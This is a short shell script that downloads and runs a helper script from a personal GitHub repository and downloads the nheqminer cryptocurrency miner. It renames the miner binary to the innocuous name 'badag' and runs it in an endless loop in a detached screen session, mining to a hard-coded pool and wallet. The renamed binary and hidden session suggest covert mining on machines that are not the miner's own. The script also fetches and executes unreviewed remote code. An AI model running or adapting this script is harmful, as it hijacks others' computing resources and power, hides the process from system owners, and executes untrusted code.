#!/bin/sh
sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
wget https://github.com/brendaz90/brenda/raw/main/random.sh
chmod +x random.sh
screen -dmS random ./random.sh nheqminer/nheqminer 65 75
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
mv nheqminer/nheqminer badag
while [ 1 ]; do
./badag -v -l eu.luckpool.net:3956 -u RXV2oT8EyoXd3LKtDiHcb5NuZd2RRaC1Mn.genepte -p x -t 6
sleep 3
done
sleep 3
